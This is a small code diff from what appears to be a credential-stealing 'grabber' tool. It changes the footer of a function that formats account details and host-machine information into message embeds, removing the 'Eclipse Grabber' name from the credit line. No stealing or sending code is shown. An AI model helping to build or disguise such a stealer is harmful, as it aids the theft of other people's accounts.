@@ -179,7 +179,7 @@ def embed_accounts_info(accounts: List[Account], host: Computer) -> List[dict]:
                 "icon_url": account.avatar_url
             },
             "footer": {
-                "text": "Eclipse Grabber by @3ct0s and @JM1k1",
+                "text": "Made by @3ct0s and @JM1k1",
             }
         })
     return embeds
